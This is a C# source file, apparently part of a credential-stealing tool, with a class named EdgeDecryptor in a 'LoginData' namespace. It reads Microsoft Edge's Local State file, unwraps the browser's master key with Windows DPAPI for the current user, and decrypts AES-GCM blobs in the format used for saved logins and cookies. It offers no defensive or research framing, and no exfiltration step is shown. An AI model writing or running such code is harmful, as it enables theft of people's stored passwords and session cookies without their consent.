using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LoginData
{
    internal class EdgeDecryptor
    {
        public static byte[] GetKey()
        {
            var sR = string.Empty;
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
            var path = Path.GetFullPath(appdata + "\\..\\Local\\Microsoft\\Edge\\User Data\\Local State");
            
            var v = File.ReadAllText(path);

            dynamic json = JsonConvert.DeserializeObject(v);
            string key = json.os_crypt.encrypted_key;

            var src = Convert.FromBase64String(key);
            var encryptedKey = src.Skip(5).ToArray();

            var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

            return decryptedKey;
        }

        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            var sR = string.Empty;
            //DecryptInMemoryData(Buffer, MemoryProtectionScope.SameLogon);
            //DecryptDataFromStream(Buffer, encryptedBytes, Buffer, )
            try
            {
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                var plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }

            return sR;
        }

        public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];
            
            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        public static void DecryptInMemoryData(byte[] Buffer, MemoryProtectionScope Scope)
        {
            if (Buffer == null)
                throw new ArgumentNullException(nameof(Buffer));
            if (Buffer.Length <= 0)
                throw new ArgumentException("The buffer length was 0.", nameof(Buffer));

            // Decrypt the data in memory. The result is stored in the same array as the original data.
            ProtectedMemory.Unprotect(Buffer, Scope);
        }

        public static byte[] DecryptDataFromStream(byte[] Entropy, DataProtectionScope Scope, Stream S, int Length)
        {
            if (S == null)
                throw new ArgumentNullException(nameof(S));
            if (Length <= 0)
                throw new ArgumentException("The given length was 0.", nameof(Length));
            if (Entropy == null)
                throw new ArgumentNullException(nameof(Entropy));
            if (Entropy.Length <= 0)
                throw new ArgumentException("The entropy length was 0.", nameof(Entropy));

            byte[] inBuffer = new byte[Length];
            byte[] outBuffer;

            // Read the encrypted data from a stream.
            if (S.CanRead)
            {
                S.Read(inBuffer, 0, Length);

                outBuffer = ProtectedData.Unprotect(inBuffer, Entropy, Scope);
            }
            else
            {
                throw new IOException("Could not read the stream.");
            }

            // Return the decrypted data
            return outBuffer;
        }

    }
}
